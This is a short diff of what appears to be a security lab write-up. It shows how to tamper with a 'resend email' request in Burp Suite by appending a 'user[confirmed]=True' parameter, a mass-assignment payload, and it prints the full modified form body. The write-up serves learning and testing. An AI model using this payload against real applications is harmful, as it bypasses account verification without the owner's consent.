@@ -20,7 +20,8 @@ We create a user and login as user
 Then click resend email
 Use burpsuite to change the payload
 ```
-Add this to the payload
-&user%5Bconfirmed%5D=True
+Add this to the payload    &user%5Bconfirmed%5D=True
+
+
 _method=patch&authenticity_token=_QlOu-myYsI4qa-ASLIILonpLq6osynvu13Pmk0nln3kFf28ppete5SOJVGvvx3FffC3obtJeveir0LXeEkudQ&user%5Bconfirmed%5D=True&user%5Bemail%5D=test%40test.com&commit=Change%20email
 ```
